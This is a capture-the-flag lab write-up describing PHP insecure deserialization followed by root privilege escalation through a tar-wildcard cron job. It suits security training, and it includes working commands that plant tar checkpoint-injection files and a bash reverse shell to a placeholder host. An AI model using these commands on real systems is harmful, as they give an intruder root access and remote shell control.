# Maq178: Deserialization

> **Platform:** SEC4US CTF Lab | **Category:** Web: Insecure Deserialization | **Points:** Dynamic

## Overview

PHP application vulnerable to insecure deserialization with a tar wildcard cron job for root privilege escalation.

---

## Approach

**Technique:** PHP Object Injection + Tar Wildcard Cron Privesc

### Reconnaissance

```bash
nmap -sV -sC -p- <TARGET_IP> -oN nmap_full.txt
```

### Exploitation

1. **Deserialization detection:** The web application accepts serialized PHP objects in a cookie or parameter
2. **Object injection:** Craft a malicious serialized PHP object that triggers file write or code execution when deserialized
3. **Initial shell:** Obtain a reverse shell as the web application user
4. **Cron discovery:** A cron job runs `tar` with a wildcard (`*`) in a world-writable directory
5. **Tar checkpoint injection:** Create malicious files in the tar directory:
   ```bash
   echo "" > "--checkpoint=1"
   echo "" > "--checkpoint-action=exec=sh shell.sh"
   echo "#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1" > shell.sh
   ```
6. **Root shell:** Wait for the cron job to execute tar, triggering the checkpoint action as root

### Tools Used

Burp Suite, PHP serialize/unserialize, tar checkpoint exploit, netcat

---

## Security Frameworks

### MITRE ATT&CK

| Technique | Description |
|-----------|-------------|
| T1059.004 | Unix Shell |
| T1053.003 | Cron |

### CWE

| ID | Description |
|----|-------------|
| CWE-502 | Deserialization of Untrusted Data |

---

## Author

**Andre Henrike** (@mrhenrike)

Never trust serialized data from the client. What goes in as an object may come back as a shell. Thanks guys!! (❍ᴥ❍ʋ)

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike

---

*For educational purposes only. Do not use any technique shown here against systems you do not own or have explicit permission to test.*
